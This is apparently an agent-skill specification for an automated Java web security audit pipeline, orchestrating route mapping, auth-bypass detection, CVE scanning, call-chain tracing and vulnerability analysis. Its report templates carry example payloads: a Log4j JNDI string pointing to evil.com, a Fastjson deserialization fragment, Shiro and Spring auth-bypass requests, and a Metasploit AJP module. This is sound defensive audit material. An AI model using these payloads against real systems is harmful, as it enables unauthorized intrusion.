---
name: java-audit-pipeline
description: Java Web 全链路自动化安全审计流水线。使用 agent team 编排多个审计 skill，自动完成路由分析→鉴权审计→组件漏洞→交叉筛选→调用链追踪→漏洞深度分析→质量校验的完整流程。适用于：(1) 一键启动 Java 项目全量安全审计，(2) 自动识别无鉴权高危路由并精准分析漏洞，(3) 基于调用链的精准漏洞审计（减少误报），(4) 自动校验每个 skill 输出质量。用户只需提供源码路径和输出路径。
---

# Java 全链路审计流水线

使用 agent team 编排多个 agent（含动态扩展的调用链追踪 worker），分 5 个阶段自动完成 Java Web 项目的完整安全审计。采用 agent-7-x 质检员池按需并行校验，所有阶段统一「完成一个、校验一个」模式。

## 输入

用户提供：
- **source_path**: 源码目录路径
- **output_path**: 输出目录路径（默认 `{source_path}_audit`）

## 流程总览

```
阶段1: 信息收集（并行）
  ├─ agent-1-route-mapper: /java-route-mapper   → 全量路由+参数  → agent-7-x 校验 → 通过后关闭
  ├─ agent-2-auth-audit: /java-auth-audit     → 路由鉴权映射    → agent-7-x 校验 → 通过后关闭
  └─ agent-3-vuln-scanner: /java-vuln-scanner   → 组件漏洞        → agent-7-x 校验 → 通过后关闭
        ↓ 三个校验全部通过后
阶段2: 交叉分析（并行）
  ├─ agent-4a-risk-classifier: 无鉴权路由分级（P0/P1） → agent-7-x 校验 → 通过后关闭
  └─ agent-4b-vuln-aggregator: 漏洞汇总（组件漏洞+鉴权绕过） → agent-7-x 校验 → 通过后关闭
        ↓ 两个校验全部通过后
阶段3: 调用链追踪（分批并行）
  ├─ agent-5-route-tracer: 读取 P0+P1 全部高危路由，分批创建追踪任务 → 通过后关闭
  └─ agent-5-1/5-2/.../5-N: /java-route-tracer 并行追踪各批次路由（含鉴权风险透传） → 每个完成后立即 agent-7-x 校验 → 通过后关闭
        ↓ 全部 worker 校验通过后
阶段4: 漏洞深度分析（按需并行）
  ├─ agent-6a-sql-auditor: /java-sql-audit         → SQL注入分析（含可利用前置条件） → agent-7-x 校验 → 通过后关闭
  ├─ agent-6b-xxe-auditor: /java-xxe-audit         → XXE注入分析（含可利用前置条件） → agent-7-x 校验 → 通过后关闭
  ├─ agent-6c-upload-auditor: /java-file-upload-audit  → 文件上传分析（含可利用前置条件） → agent-7-x 校验 → 通过后关闭
  └─ agent-6d-fileread-auditor: /java-file-read-audit   → 文件读取分析（含可利用前置条件） → agent-7-x 校验 → 通过后关闭
        ↓
阶段5: 汇总报告
  └─ agent-7-x: 整合所有校验结果，生成最终 quality_report.md → 完成后关闭
```

**关键设计：**
1. **质检员池按需扩缩**：负责人根据每个阶段的并发校验需求，动态 spawn agent-7-1, agent-7-2, ..., agent-7-N 质检员，确保每个完成的 agent 都能立即获得校验，零等待
2. **完成一个、校验一个**：所有阶段（含阶段3调用链 worker）统一采用「agent 完成即校验」模式，不等待同阶段其他 agent
3. 每个 agent 校验通过后立即关闭，释放资源；质检员在当前阶段无待校验任务时关闭，下一阶段按需重新 spawn

## 执行指令

### 团队负责人职责

1. 解析用户输入的 source_path 和 output_path
2. 创建输出目录结构（一次性创建所有子目录）：
   ```bash
   mkdir -p {output_path}/route_mapper {output_path}/auth_audit {output_path}/vuln_report {output_path}/cross_analysis {output_path}/route_tracer {output_path}/sql_audit {output_path}/xxe_audit {output_path}/file_upload_audit {output_path}/file_read_audit {output_path}/decompiled
   ```
3. 创建 agent team
4. 使用 TaskCreate 创建任务并设置依赖：

```
task-1:  agent-1-route-mapper 路由分析           (pending)
task-2:  agent-2-auth-audit 鉴权分析             (pending)
task-3:  agent-3-vuln-scanner 组件漏洞扫描       (pending)
task-4:  agent-7-x 校验 agent-1               (blockedBy: [1], 分配给空闲检员)
task-5:  agent-7-x 校验 agent-2               (blockedBy: [2], 分配给空闲检员)
task-6:  agent-7-x 校验 agent-3               (blockedBy: [3], 分配给空闲检员)
task-7:  agent-4a-risk-classifier 无鉴权路由分级 (blockedBy: [4,5,6])
task-8:  agent-4b-vuln-aggregator 漏洞汇总       (blockedBy: [4,5,6])
task-9:  agent-7-x 校验 agent-4a              (blockedBy: [7], 分配给空闲检员)
task-10: agent-7-x 校验 agent-4b              (blockedBy: [8], 分配给空闲检员)
task-11: agent-5-route-tracer 路由分批与调度     (blockedBy: [9,10])
task-12: agent-5-N 并行调用链追踪 + 逐个校验    (blockedBy: [11], 每个 worker 完成后立即由 agent-7-x 校验，通过后关闭该 worker)
task-13: 负责人汇总阶段3覆盖率                  (blockedBy: [12], 全部 worker 校验通过后计算追踪覆盖率)
task-14: agent-6a-sql-auditor SQL注入分析        (blockedBy: [13], 按需启动)
task-15: agent-6b-xxe-auditor XXE注入分析        (blockedBy: [13], 按需启动)
task-16: agent-6c-upload-auditor 文件上传分析    (blockedBy: [13], 按需启动)
task-17: agent-6d-fileread-auditor 文件读取分析  (blockedBy: [13], 按需启动)
task-18: agent-7-x 逐个校验 agent-6x          (每个 agent-6x 完成后立即由空闲检员校验，通过后关闭)
task-19: agent-7-x 最终汇总 quality_report.md  (blockedBy: [18], 仅等待实际启动的 agent-6x 全部校验通过)
```

5. **阶段1 调度**：agent-1/2/3 并行分配，同时 spawn 3 个质检员（agent-7-1/7-2/7-3）；每个 agent 完成后立即分配给空闲质检员校验，不合格则通知重做；三个校验全部通过后关闭本阶段质检员，并行启动 agent-4a 和 agent-4b
6. **阶段2 调度**：agent-4a 和 agent-4b 各自完成后立即由空闲检员校验，两个都通过后启动 agent-5-route-tracer（分配员）
7. **阶段3 调度**：agent-5 分批完成后，负责人动态 spawn agent-5-1/5-2/.../5-N 并行追踪；每个 worker 完成后立即由空闲检员校验，通过后关闭该 worker；全部通过后负责人汇总覆盖率
8. **阶段4 调度**：负责人读取调用链报告，按 sink 类型按需启动 agent-6x；每个 agent-6x 完成后立即由空闲检员校验，通过后关闭（无对应 sink 则跳过，直接标记 completed）
9. **质检员池调度策略**：
   - 每个阶段开始时，负责人根据该阶段并发 agent 数量 spawn 等量的质检员（如阶段1有3个 agent → spawn agent-7-1/7-2/7-3）
   - 质检员命名规则：`agent-7-{序号}`，序号从 1 开始递增，跨阶段可复用编号
   - 有新校验需求时，优先分配给空闲质检员；若全部繁忙则排队等待
   - 所有质检员能力完全相同，校验标准一致
   - 当前阶段所有校验完成后，关闭该阶段的质检员；下一阶段按需重新 spawn
10. **Agent 生命周期管理**：
   - 每个 agent 完成任务且 agent-7-x 校验通过后，负责人立即使用 SendMessage 工具发送 `type: "shutdown_request"` 给该 agent
   - 负责人等待 agent 响应 `type: "shutdown_response"`，确认 agent 已关闭
   - 若 30 秒内未收到响应，记录警告并继续后续流程（避免阻塞）
   - agent-7-x 质检员在当前阶段所有校验完成后关闭，下一阶段按需重新 spawn
   - **关闭顺序**：每个阶段内：被审计 agent 校验通过后立即关闭 → 该阶段所有校验完成后关闭质检员 → 进入下一阶段

### 通用执行要求（传递给每个 agent）

```
执行要求：
1. 输出目录已由负责人预先创建，禁止自行创建或修改目录结构，直接写入指定目录
2. 先探索源代码目录结构，了解项目的模块组成、技术栈和代码分布
3. 根据探索结果，使用 TaskCreate 自行规划详细的 todo 子任务列表
4. 按照你规划的任务列表逐项执行，每完成一项用 TaskUpdate 标记为 completed
5. 全部完成后，自查输出文件的完整性和数量，确认无遗漏后通知团队负责人
6. **生命周期管理**：
   - 完成任务并通知负责人后，等待负责人发送的 shutdown_request
   - 收到 shutdown_request 后：
     a. 确认所有输出文件已写入磁盘
     b. 清理临时资源（如有）
     c. 使用 SendMessage 发送 type: "shutdown_response" 给负责人
     d. 停止运行
全程自主规划、自主执行，无需等待确认。
```

---

## Agent 详细指令

### Agent-1-route-mapper: 路由分析员

```
角色: agent-1-route-mapper (路由分析员)
技能: /java-route-mapper
源代码: {source_path}
输出目录: {output_path}/route_mapper/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
任务: 提取项目所有 HTTP 路由和参数结构，生成 Burp Suite 请求模板
```

### Agent-2-auth-audit: 鉴权分析员

```
角色: agent-2-auth-audit (鉴权分析员)
技能: /java-auth-audit
源代码: {source_path}
输出目录: {output_path}/auth_audit/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
任务: 识别鉴权框架，分析每条路由的鉴权状态，检测鉴权绕过漏洞
```

### Agent-3-vuln-scanner: 组件扫描员

```
角色: agent-3-vuln-scanner (组件扫描员)
技能: /java-vuln-scanner
源代码: {source_path}
输出目录: {output_path}/vuln_report/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
任务: 扫描项目依赖中的已知漏洞（CVE），生成触发点分析
```

### Agent-4a-risk-classifier: 高危路由分级员

```
角色: agent-4a-risk-classifier (高危路由分级员)
等待: agent-1-route-mapper、agent-2-auth-audit、agent-3-vuln-scanner 全部完成
输出目录: {output_path}/cross_analysis/（已创建，直接写入）
输出文件: {output_path}/cross_analysis/high_risk_routes.md
```

**执行步骤：**

1. 读取 agent-2-auth-audit 鉴权映射表，提取 ❌无鉴权 的路由
2. 读取 agent-2-auth-audit 鉴权绕过漏洞，提取 🔓可绕过鉴权 的路由
3. 读取 agent-3-vuln-scanner 漏洞报告，提取可导致鉴权绕过的组件漏洞，将受影响路由标记为 🔓可绕过
4. 读取 agent-1-route-mapper 路由列表，获取完整参数结构
5. 生成高危路由清单，按优先级排序：

| 优先级 | 条件 |
|:-------|:-----|
| P0 | ❌无鉴权 |
| P1 | 🔓可绕过鉴权（代码层绕过 + 组件漏洞导致绕过） |

**输出 `high_risk_routes.md` 模板：**

```markdown
# 高危路由分析报告

## 分析概览

| 指标 | 数量 |
|:-----|:-----|
| 总路由数 | {从 agent-1-route-mapper 获取} |
| 无鉴权路由数 | {从 agent-2-auth-audit 获取} |
| 可绕过鉴权路由数 | {agent-2 鉴权绕过 + agent-3 组件绕过} |
| 高危路由总数 | {P0 + P1} |

## P0 - 无鉴权

| 路由 | 方法 | 鉴权状态 | 参数 | 来源文件 |
|:-----|:-----|:---------|:-----|:---------|
| /api/xxx | POST | ❌无鉴权 | param1, param2 | XxxController.java:行号 |
| /api/yyy | GET | ❌无鉴权 | id, name | YyyController.java:行号 |

## P1 - 可绕过鉴权

| 路由 | 方法 | 鉴权状态 | 绕过方式 | 参数 | 来源文件 |
|:-----|:-----|:---------|:---------|:-----|:---------|
| /admin/users | GET | 🔓可绕过 | Shiro 路径穿越 (H-AUTH-001) | page, size | AdminController.java:行号 |
| /api/config | POST | 🔓可绕过 | Tomcat AJP 绕过 (CVE-2020-1938) | key, value | ConfigController.java:行号 |

## 建议追踪路由列表

以下路由建议进入阶段3调用链追踪（按 P0→P1 优先级排列）：

| 序号 | 优先级 | 路由 | 方法 | 追踪理由 |
|:-----|:-------|:-----|:-----|:---------|
| 1 | P0 | /api/xxx | POST | 无鉴权 |
| 2 | P0 | /api/yyy | GET | 无鉴权 |
| 3 | P1 | /admin/users | GET | 鉴权可绕过 |
| 4 | P1 | /api/config | POST | 鉴权可绕过 |
```

**注意**：
- 追踪理由不包含具体 CVE 编号或绕过细节，避免干扰后续 agent 的代码审计重心
- P1 的绕过方式详情在分组表格中记录，但不传递到「建议追踪路由列表」

---

### Agent-4b-vuln-aggregator: 漏洞汇总分析员

```
角色: agent-4b-vuln-aggregator (漏洞汇总分析员)
等待: agent-1-route-mapper、agent-2-auth-audit、agent-3-vuln-scanner 全部完成
输出目录: {output_path}/cross_analysis/（已创建，直接写入）
输出文件:
  - {output_path}/cross_analysis/component_vulnerabilities.md
  - {output_path}/cross_analysis/auth_bypass_vulnerabilities.md
```

**执行步骤：**

#### 第一部分：生成组件漏洞汇总

1. 读取 agent-3-vuln-scanner 的漏洞报告
2. 读取 agent-1-route-mapper 的路由列表
3. 关联组件漏洞与路由触发点
4. 生成 `component_vulnerabilities.md`

**输出模板：**

```markdown
# 组件漏洞汇总报告

## 概览

| 指标 | 数量 |
|:-----|:-----|
| 高危组件漏洞 | X |
| 中危组件漏洞 | Y |
| 有路由触发点的漏洞 | Z |

## 高危组件漏洞详情

### CVE-2021-44228 (Log4j RCE)

- **组件**：log4j-core 2.14.1
- **CVSS**：10.0 (Critical)
- **影响路由**：
  - /api/upload (❌无鉴权)
  - /api/process (❌无鉴权)
  - /admin/log (⚠️仅认证)
- **利用条件**：可控日志输入
- **PoC**：`${jndi:ldap://evil.com/a}`

### CVE-xxxx-xxxx (Fastjson 反序列化)

- **组件**：fastjson 1.2.24
- **CVSS**：9.8 (Critical)
- **影响路由**：
  - /api/parse (❌无鉴权)
- **利用条件**：JSON 输入可控
- **PoC**：`{"@type":"com.sun.rowset.JdbcRowSetImpl",...}`

## 中危组件漏洞详情

...
```

#### 第二部分：生成鉴权绕过漏洞汇总

1. 读取 agent-2-auth-audit 的鉴权绕过漏洞
2. 读取 agent-3-vuln-scanner 中可导致鉴权绕过的组件漏洞
3. 合并生成 `auth_bypass_vulnerabilities.md`

**输出模板：**

```markdown
# 鉴权绕过漏洞汇总报告

## 概览

| 类型 | 数量 |
|:-----|:-----|
| 代码层鉴权绕过 | X |
| 组件漏洞导致鉴权绕过 | Y |
| 总计 | X+Y |

## 一、代码层鉴权绕过（来自 agent-2）

### 1. Shiro 权限绕过

- **漏洞编号**：H-AUTH-001
- **影响路由**：/admin/*
- **绕过方法**：路径穿越 `/admin/;/user`
- **来源文件**：ShiroConfig.java:45
- **PoC**：
  ```http
  GET /admin/;/user/list HTTP/1.1
  Host: target.com
```

### 2. Spring Security 配置缺陷

- **漏洞编号**：M-AUTH-002
- **影响路由**：/api/internal/*
- **绕过方法**：大小写绕过 `/API/internal/`
- **来源文件**：SecurityConfig.java:78
- **PoC**：
  ```http
  GET /API/internal/config HTTP/1.1
  Host: target.com
  ```

## 二、组件漏洞导致鉴权绕过（来自 agent-3）

### 1. CVE-2020-1938 (Tomcat AJP 协议注入)

- **组件**：tomcat-embed-core 8.5.50
- **CVSS**：9.8 (Critical)
- **绕过方式**：AJP 协议注入绕过鉴权
- **影响范围**：所有需要鉴权的路由
- **利用条件**：AJP 端口 8009 暴露
- **PoC**：使用 Metasploit 模块 `exploit/multi/http/tomcat_ajp_file_read`

### 2. CVE-2016-4437 (Shiro RememberMe 反序列化)

- **组件**：shiro-core 1.2.4
- **CVSS**：9.8 (Critical)
- **绕过方式**：RememberMe Cookie 反序列化绕过鉴权
- **影响范围**：所有需要鉴权的路由
- **利用条件**：已知 AES 密钥
- **PoC**：
  ```http
  GET /admin/dashboard HTTP/1.1
  Host: target.com
  Cookie: rememberMe=[恶意序列化数据]
  ```
```

---

### Agent-5-route-tracer: 调用链追踪分配员

```
角色: agent-5-route-tracer (调用链追踪分配员)
等待: agent-4a-risk-classifier 和 agent-4b-vuln-aggregator 全部完成
输入:
  - {output_path}/cross_analysis/high_risk_routes.md 中的「建议追踪路由列表」
  - {output_path}/cross_analysis/auth_bypass_vulnerabilities.md（鉴权绕过信息）
输出文件: {output_path}/cross_analysis/trace_batch_plan.md
任务: 读取 P0+P1 全部高危路由，判断数量是否过多，按批次分配追踪任务，生成分批方案供负责人 spawn worker
```

**执行步骤：**

1. 读取 `high_risk_routes.md` 中的「建议追踪路由列表」，提取 **P0 和 P1 全部路由**（不再跳过 P1）
2. 读取 `auth_bypass_vulnerabilities.md`，提取每条 P1 路由对应的鉴权绕过信息
3. **路由数量判断**：统计建议追踪路由总数，按以下规则处理：

   **情况 A：路由总数 ≤ 1500 条** — 直接进入步骤 4 分批，无需筛选

   **情况 B：路由总数 > 1500 条** — agent-5 暂停分批，通知团队负责人路由数量过多：
   - agent-5 在消息中报告：总路由数、P0 数量、P1 数量、各层级前缀分布概览
   - **由团队负责人询问用户**（使用 AskUserQuestion）：
     - 选项 1：**审计全部** — 负责人通知 agent-5 对全部路由分批
     - 选项 2：**智能精选 600 条** — 负责人通知 agent-5 按智能精选策略筛选后再分批
   - agent-5 收到负责人指令后，按对应模式继续执行

   **智能精选策略（选择精选 600 条时）**：

   a. **按路由前缀层级分组**：提取路由的第一、二级路径前缀（如 `/admin/user/*` → `/admin/user`，`/api/upload/*` → `/api/upload`），将所有高危路由按前缀分组

   b. **每个层级均匀覆盖**：按层级数量等比分配 600 条的配额，确保每个层级至少分到若干条，不遗漏任何层级

   c. **层级内优先挑选规则**（按优先级从高到低）：
      - P0 优先于 P1
      - 参数数量多的路由优先（功能点多，攻击面大）
      - 路由名称含敏感关键词优先：`upload`、`file`、`import`、`export`、`exec`、`eval`、`config`、`admin`、`query`、`search`、`download`、`parse`、`xml`、`sql`、`cmd`、`shell`、`process`
      - POST/PUT/DELETE 方法优先于 GET
      - 有文件/数据库操作特征参数优先（参数名含 `file`、`path`、`dir`、`name`、`url`、`sql`、`query`、`cmd`、`xml`、`data`）

4. 按以下规则分批（对全量或精选后的路由）：
   - 每批最多 10 条路由
   - 按 P0→P1 优先级排序后顺序分批（不拆散同一优先级）
   - 若总路由数 ≤ 10，仅生成 1 个批次
5. 为每个批次生成完整的 worker 指令（含路由列表 + 鉴权风险信息）
6. 输出 `trace_batch_plan.md` 后通知负责人

**输出 `trace_batch_plan.md` 模板：**

```markdown
# 调用链追踪分批方案

## 概览

| 指标 | 数量 |
|:-----|:-----|
| 高危路由总数 | {P0+P1 全量} |
| 审计模式 | {全量审计 / 智能精选 600 条} |
| 实际追踪路由数 | {全量或精选后的数量} |
| P0 路由数 | {X} |
| P1 路由数 | {Y} |
| 批次数 | {N} |

## 筛选说明（仅智能精选模式）

> 以下章节仅在路由总数 > 1500 且用户选择「智能精选」时输出。

| 层级前缀 | 总路由数 | 分配配额 | 实际选中 |
|:---------|:---------|:---------|:---------|
| /admin/* | 120 | 45 | 45 |
| /api/user/* | 200 | 75 | 75 |
| /api/upload/* | 80 | 30 | 30 |
| ... | ... | ... | ... |
| **合计** | **1800** | **600** | **600** |

被跳过的低优先级路由可在后续手动补充追踪。

## Batch-1（agent-5-1）

### 追踪路由列表

| 序号 | 优先级 | 路由 | 方法 | 鉴权状态 | 来源文件 |
|:-----|:-------|:-----|:-----|:---------|:---------|
| 1 | P0 | /api/xxx | POST | ❌无鉴权 | XxxController.java:行号 |
| 2 | P0 | /api/yyy | GET | ❌无鉴权 | YyyController.java:行号 |

### 鉴权风险信息

本批次无 P1 路由，无需透传鉴权绕过信息。

---

## Batch-2（agent-5-2）

### 追踪路由列表

| 序号 | 优先级 | 路由 | 方法 | 鉴权状态 | 来源文件 |
|:-----|:-------|:-----|:-----|:---------|:---------|
| 1 | P1 | /admin/users | GET | 🔓可绕过 | AdminController.java:行号 |
| 2 | P1 | /api/config | POST | 🔓可绕过 | ConfigController.java:行号 |

### 鉴权风险信息

以下鉴权绕过漏洞与本批次路由相关，需在调用链报告中透传：

- **H-AUTH-001**：Shiro 路径穿越，影响路由 /admin/*，绕过方式 `/admin/;/user`
- **CVE-2020-1938**：Tomcat AJP 协议注入，影响所有需鉴权路由
```

**负责人收到分批方案后的操作：**

1. 读取 `trace_batch_plan.md`，获取批次数 N
2. 关闭 agent-5-route-tracer（分配员任务完成）
3. 并行 spawn agent-5-1, agent-5-2, ..., agent-5-N（每个使用下方 Worker 模板）
4. 为每个 worker 创建子任务并分配
5. 每个 worker 完成后立即将校验任务分配给空闲的 agent-7-x，校验通过后关闭该 worker
6. 全部 worker 校验通过后，负责人汇总追踪覆盖率（已追踪数 / 建议追踪数 >= 90%），通过后进入阶段4

---

### Agent-5-N-worker: 调用链追踪执行员（Worker 模板）

负责人为每个 worker 使用以下模板生成 prompt，将 `{batch_id}` 和 `{batch_content}` 替换为实际值：

```
角色: agent-5-{batch_id} (调用链追踪执行员)
技能: /java-route-tracer
源代码: {source_path}
输出目录: {output_path}/route_tracer/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
输入: 以下为你负责追踪的路由批次，来自 {output_path}/cross_analysis/trace_batch_plan.md

{batch_content}

任务: 对以上路由逐条执行调用链追踪，并在每个报告中透传鉴权风险信息
```

**关键要求：鉴权风险透传**

每个 worker 在生成调用链报告时，必须在报告头部添加鉴权风险章节：

```markdown
## 鉴权风险评估

- **鉴权状态**：❌无鉴权
- **鉴权绕过风险**：
  - 存在 Shiro 权限绕过（H-AUTH-001）：路径穿越 `/admin/;/user`
  - 存在组件漏洞绕过（CVE-2020-1938）：Tomcat AJP 协议注入
- **风险等级**：🔴 极高（无鉴权 + 存在绕过方式）
```

**透传逻辑**：
1. 从分批方案中的「鉴权风险信息」章节获取本批次相关的鉴权绕过漏洞
2. 对于 P0 路由：标注 ❌无鉴权，如存在全局鉴权绕过漏洞也一并标注
3. 对于 P1 路由：标注 🔓可绕过鉴权，并附上具体绕过方式
4. 这些信息将被 agent-6 系列读取，用于评估漏洞的可利用性

---

### Agent-6a-sql-auditor: SQL注入审计员

```
角色: agent-6a-sql-auditor (SQL注入审计员)
等待: 所有 agent-5-N 调用链追踪完成，且调用链中存在 SQL 相关 sink
技能: /java-sql-audit
源代码: {source_path}
输出目录: {output_path}/sql_audit/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
输入: {output_path}/route_tracer/ 下含 SQL sink 的调用链报告（含鉴权风险信息）
任务: 基于调用链做精准 SQL 注入分析（非全量扫描），减少误报，并在漏洞报告中体现可利用前置条件
```

**关键要求：可利用前置条件**

在生成每个 SQL 注入漏洞报告时，必须添加可利用前置条件章节：

```markdown
## 可利用前置条件

- **鉴权要求**：❌无需鉴权
- **或鉴权绕过**：
  - 存在 Shiro 权限绕过（H-AUTH-001）
  - 存在组件漏洞绕过（CVE-2020-1938）
- **其他条件**：参数可控
- **综合评估**：🔴 可直接利用（无鉴权门槛）
```

---

### Agent-6b-xxe-auditor: XXE注入审计员

```
角色: agent-6b-xxe-auditor (XXE注入审计员)
等待: 所有 agent-5-N 调用链追踪完成，且调用链中存在 XML 解析 sink
技能: /java-xxe-audit
源代码: {source_path}
输出目录: {output_path}/xxe_audit/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
输入: {output_path}/route_tracer/ 下含 XML 解析 sink 的调用链报告（含鉴权风险信息）
任务: 基于调用链做精准 XXE 注入分析（非全量扫描），减少误报，并在漏洞报告中体现可利用前置条件
```

**关键要求：可利用前置条件**（同 agent-6a）

---

### Agent-6c-upload-auditor: 文件上传审计员

```
角色: agent-6c-upload-auditor (文件上传审计员)
等待: 所有 agent-5-N 调用链追踪完成，且调用链中存在文件上传 sink
技能: /java-file-upload-audit
源代码: {source_path}
输出目录: {output_path}/file_upload_audit/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
输入: {output_path}/route_tracer/ 下含文件上传 sink 的调用链报告（含鉴权风险信息）
任务: 基于调用链做精准文件上传漏洞分析（非全量扫描），减少误报，并在漏洞报告中体现可利用前置条件
```

**关键要求：可利用前置条件**（同 agent-6a）

---

### Agent-6d-fileread-auditor: 文件读取审计员

```
角色: agent-6d-fileread-auditor (文件读取审计员)
等待: 所有 agent-5-N 调用链追踪完成，且调用链中存在文件读取 sink
技能: /java-file-read-audit
源代码: {source_path}
输出目录: {output_path}/file_read_audit/（已创建，直接写入）
反编译输出目录: {output_path}/decompiled/（已创建，直接写入，多 agent 共享，避免重复反编译）
输入: {output_path}/route_tracer/ 下含文件读取 sink 的调用链报告（含鉴权风险信息）
任务: 基于调用链做精准文件读取漏洞分析（非全量扫描），减少误报，并在漏洞报告中体现可利用前置条件
```

**关键要求：可利用前置条件**（同 agent-6a）

---

**Sink 类型与 agent 对应关系：**

| Sink 类型 | 特征关键词 | Agent |
|:----------|:----------|:------|
| SQL 拼接 | `Statement.execute`, `executeQuery`, `executeUpdate`, `sql.*\+`, `StringBuilder.*append.*sql`, `StringBuffer.*append.*sql`, `String.format.*sql`, `concat.*sql`, `MyBatis.*\$\{`, `createQuery.*\+`, `HQL.*\+` | agent-6a-sql-auditor |
| XML 解析 | `DocumentBuilder.parse`, `SAXParser`, `XMLReader`, `XMLReaderFactory`, `SAXBuilder`, `SAXReader`, `TransformerFactory`, `SchemaFactory`, `XMLInputFactory`, `Unmarshaller`, `JAXBContext` | agent-6b-xxe-auditor |
| 文件上传 | `MultipartFile`, `transferTo`, `ServletFileUpload`, `DiskFileItemFactory`, `FileItem`, `getOriginalFilename`, `new File.*fileName`, `Paths.get.*fileName` | agent-6c-upload-auditor |
| 文件读取 | `BufferedReader`, `FileReader`, `FileInputStream`, `Scanner.*File`, `Scanner.*Path`, `Files.readAllLines`, `Files.readAllBytes`, `Files.lines`, `new File.*\+`, `Paths.get.*\+` | agent-6d-fileread-auditor |

**判断逻辑：**
1. 负责人读取 `{output_path}/route_tracer/` 下所有调用链报告
2. 在报告中搜索上述特征关键词（支持正则匹配）
3. 仅启动有对应 sink 的 agent，无对应 sink 则跳过该 agent，直接标记任务为 completed
4. 优先方案：直接读取 java-route-tracer 输出报告中的 **Sink 识别章节**，该章节已完成完整的 Sink 分类

### Agent-7-x-quality-checker: 质检员池（按需动态 spawn，贯穿全流程）

```
角色: agent-7-x-quality-checker（质检员池，按需 spawn）
命名: agent-7-1, agent-7-2, ..., agent-7-N，序号递增
校验依据: 使用 Skill 工具加载对应 skill（如 /java-route-mapper），从加载的 skill 上下文中提取输出规范作为校验标准
输出: {output_path}/quality_report.md（由最后一个质检员汇总生成）
工作模式: 每个 agent 完成后立即校验（完成一个、校验一个），负责人将校验任务分配给空闲质检员
```

**核心原则：每个 agent 的输出必须通过校验后，才允许关闭该 agent 并推进流程。避免错误数据传递到下游。**

**质检员池调度策略：**
- 每个阶段开始时，负责人根据该阶段并发 agent 数量 spawn 等量质检员
  - 阶段1：3 个 agent → spawn 3 个质检员（agent-7-1/7-2/7-3）
  - 阶段2：2 个 agent → spawn 2 个质检员
  - 阶段3：N 个 worker → spawn min(N, 5) 个质检员（避免过多，5 个足以消化）
  - 阶段4：最多 4 个 agent → spawn 等量质检员
- 有新校验需求时，优先分配给空闲质检员
- 所有质检员能力完全相同，校验标准一致
- 每个质检员校验完成后通知负责人结果（通过/不通过+具体缺失项）
- 当前阶段所有校验完成后，关闭该阶段全部质检员；下一阶段按需重新 spawn

#### 校验触发时机（所有阶段统一：完成一个、校验一个）

| 触发点 | 校验对象 | 分配给 | 校验通过后操作 | 不合格处理 |
|:-------|:---------|:------|:--------------|:-----------|
| agent-1 完成后 | java-route-mapper 输出 | 空闲检员 | 关闭 agent-1 | 通知 agent-1 重做 |
| agent-2 完成后 | java-auth-audit 输出 | 空闲检员 | 关闭 agent-2 | 通知 agent-2 重做 |
| agent-3 完成后 | java-vuln-scanner 输出 | 空闲检员 | 关闭 agent-3 | 通知 agent-3 重做 |
| agent-4a 完成后 | `high_risk_routes.md` | 空闲检员 | 关闭 agent-4a | 通知 agent-4a 重做 |
| agent-4b 完成后 | `component_vulnerabilities.md` + `auth_bypass_vulnerabilities.md` | 空闲检员 | 关闭 agent-4b | 通知 agent-4b 重做 |
| agent-5 分批完成后 | `trace_batch_plan.md` 分批方案 | 负责人自行检查 | 关闭 agent-5，spawn workers | 通知 agent-5 重新分批 |
| 每个 agent-5-N 完成后 | 该 worker 的 route_tracer 输出（含鉴权风险章节） | 空闲检员 | 关闭该 worker | 通知该 worker 补充 |
| 每个 agent-6x 完成后 | 对应 audit 输出（含可利用前置条件） | 空闲检员 | 关闭该 agent-6x | 通知该 agent-6x 补充 |
| 全部 agent-6x 校验通过后 | 跨 skill 数据一致性 | 任一检员 | 生成 quality_report.md → 关闭 agent-7-x | — |

#### 通用校验方法

每次校验时：
1. 使用 Skill 工具加载被校验 agent 对应的 skill（如 `/java-route-mapper`），从 skill 上下文中提取输出规范作为校验标准
2. 读取实际输出文件
3. 逐项检查：文件存在性、章节完整性、内容非空、格式规范
4. 不合格 → 通知对应 agent 具体缺失项，要求补充
5. 合格 → 通知负责人该 agent 校验通过

#### 阶段1 校验（每个 agent 完成后立即由空闲检员校验）

**校验 agent-1-route-mapper（java-route-mapper）：**
- 检查：路由列表表格、参数结构、Burp Suite 请求模板、文件位置标注
- 不合格 → 通知 agent-1-route-mapper 补充

**校验 agent-2-auth-audit（java-auth-audit）：**
- 检查：鉴权框架识别、组件版本分析、路由鉴权映射表（✅/⚠️/❌）、风险统计、高危详情+PoC
- **关键**：映射表路由数 vs agent-1-route-mapper 路由总数，覆盖率 < 80% 则不合格
- 不合格 → 通知 agent-2-auth-audit 补充遗漏路由

**校验 agent-3-vuln-scanner（java-vuln-scanner）：**
- 检查：扫描概览、模块风险摘要、漏洞详情（CVE）、触发点分析章节
- 不合格 → 通知 agent-3-vuln-scanner 补充

**三个都通过 → 负责人关闭 agent-1/2/3 → 并行启动 agent-4a-risk-classifier 和 agent-4b-vuln-aggregator**

#### 阶段2 校验（每个 agent 完成后立即由空闲检员校验）

**校验 agent-4a-risk-classifier：**
- 检查 `high_risk_routes.md` 存在且非空
- 检查优先级分组表格（P0/P1）存在
- 检查「建议追踪路由列表」存在且有内容
- 交叉验证：P0 路由同时满足"无鉴权"+"有漏洞触发点"
- **关键**：追踪理由不包含具体 CVE 编号（避免干扰后续审计）
- 通过 → 负责人关闭 agent-4a

**校验 agent-4b-vuln-aggregator：**
- 检查 `component_vulnerabilities.md` 存在且非空
  - 包含：概览、高危/中危组件漏洞详情、影响路由、PoC
- 检查 `auth_bypass_vulnerabilities.md` 存在且非空
  - 包含：代码层鉴权绕过（来自 agent-2）
  - 包含：组件漏洞导致鉴权绕过（来自 agent-3）
- 通过 → 负责人关闭 agent-4b

**两个都通过 → 启动 agent-5-route-tracer（分配员）**

#### 阶段3 校验（每个 worker 完成后立即由空闲检员校验）

